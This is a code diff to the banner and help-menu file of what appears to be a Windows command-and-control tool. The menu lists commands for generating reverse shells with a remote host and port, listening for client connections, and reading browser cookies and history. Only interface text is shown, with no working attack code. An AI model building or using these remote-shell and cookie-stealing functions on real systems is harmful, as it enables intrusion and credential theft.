@@ -1,25 +1,23 @@
 
 from os import system
+from termcolor import colored
 
 def banner():
-    system("clear")
-    print("""
-     ______ _  _ _______ ____  _    _ 
-    |  ____| || |__   __|___ \\| |  | |
-    | |__  | || |_ | |    __) | |__| |
-    |  __| |__   _|| |   |__ <|  __  |-WinC2 v1.1
-    | |       | |  | |   ___) | |  | | By: 0xGhazy
-    |_|       |_|  |_|  |____/|_|  |_| 
+    system("cls")
+    print(f"""
+     ___ _ _ _____ _____  _   __      ___      ___ ___ 
+    | __| | |_   _|__ / || |__\ \    / (_)_ _ / __|_  )
+    | _||_  _|| |  |_ \ __ |___\ \/\/ /| | ' \ (__ / / By:{colored("0xGhazy", "red")}
+    |_|   |_| |_| |___/_||_|    \_/\_/ |_|_||_\___/___|
 
-
-    > Script Options:                       > Description
-    -----------------                       -------------
-    gen-shell                               - Generating a new Shell with a spasific shell name, rhost, and rport.\n
-    ls-conn                                 - Display all incomming/saved connections from your clients.\n
-    listning                                - Starting listining to incomming connections.\n
-    help                                    - Displaying help menue.\n
-    main                                    - Displaying this banner again.\n
-    exit                                    - Exit this awsome tool :(\n""")
+    > Script Options:        > Description
+    -----------------        -------------
+    new-shell                - Generating a new Shell with a spasific shell name, rhost, and rport.
+    ls-conn                  - Display all incomming/saved connections from your clients.
+    listning                 - Starting listining to incomming connections.
+    help                     - Displaying help menue.
+    main                     - Displaying this banner again.
+    exit                     - Exit this awsome tool :(\n""")
 
 
 
@@ -88,36 +86,5 @@ def browser_module_help():
     read-cookies
     read-history
     """
-
-
-# def pscanner_help():
-#     print("[?] Port Scanner Help")
-#     print("=====================\n")
-#     print("Syntax: scan ip_address:port_number1,port_number")
-#     print("example: scan 127.0.0.1:8080,80,1177\nScanning. . .")
-#     print("[+] Scan Result of (8080,80,1177) ports")
-#     print("[+] Port 8080 is open")
-#     print("[+] Port 80 is open")
-#     print("[+] Port 1177 is open")
-
-
-# def ip_info_help():
-#     print("[?] IP Information Help")
-#     print("=======================\n")
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 
